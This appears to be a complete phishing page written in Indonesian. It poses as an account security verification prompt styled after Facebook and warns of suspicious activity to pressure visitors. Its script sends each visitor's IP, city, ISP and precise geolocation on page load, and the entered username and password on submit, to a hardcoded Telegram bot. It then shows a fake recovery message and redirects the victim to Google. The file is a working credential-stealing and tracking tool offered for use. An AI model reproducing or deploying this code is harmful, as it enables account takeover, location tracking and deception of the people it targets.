<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Akun</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-card { background: #fff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        .logo { font-size: 28px; font-weight: bold; color: #1877f2; margin-bottom: 10px; }
        .alert { background: #fff2f2; border: 1px solid #ffcccb; color: #d8000c; padding: 10px; font-size: 13px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; outline: none; }
        input:focus { border-color: #1877f2; }
        button { width: 100%; padding: 14px; background: #1877f2; border: none; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; }
        button:hover { background: #145dbf; }
        .footer { margin-top: 20px; font-size: 12px; color: #888; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">Verification System</div>
        <div class="alert">Peringatan: Aktivitas mencurigakan terdeteksi. Silahkan verifikasi identitas Anda untuk mencegah pemblokiran akun.</div>
        
        <input type="text" id="user" placeholder="Email, Username, atau Nomor HP" required>
        <input type="password" id="pass" placeholder="Kata Sandi" required>
        
        <button onclick="kirimData()">KONFIRMASI SEKARANG</button>
        
        <div class="footer">
            &copy; 2026 Security Service Management
        </div>
    </div>

    <script>
        // --- CONFIG TELEGRAM ---
        const botToken = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
        const chatId = "8551809114";

        // 1. Ambil IP & Lokasi Presisi saat web dibuka (Auto-Grab)
        window.onload = async () => {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ip = await ipRes.json();
                
                let logEntry = `🔔 *TARGET BARU TERDETEKSI!*\n\n• IP: ${ip.ip}\n• Kota: ${ip.city}\n• ISP: ${ip.org}\n• Platform: ${navigator.platform}`;
                await notify(logEntry);

                // Minta Izin Maps secara paksa
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        await notify(`📍 *LOKASI PRESISI (MAPS):*\n${maps}`);
                    });
                }
            } catch (e) {}
        };

        // 2. Fungsi Kirim ke Tele
        async function notify(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        }

        // 3. Ambil Credential & Redirect
        async function kirimData() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if (u === "" || p === "") {
                alert("Harap isi semua kolom verifikasi!");
                return;
            }

            // Kirim Hasil Phishing ke Telegram
            await notify(`📩 *HASIL LOGIN TARGET*\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n\n*Hajar sekarang sebelum ganti PW!*`);

            // Fake Loading & Redirect
            alert("Verifikasi sedang diproses. Akun Anda akan pulih dalam 24 jam.");
            window.location.href = "https://www.google.com"; // Lempar ke Google biar dia bingung
        }
    </script>
</body>
</html>
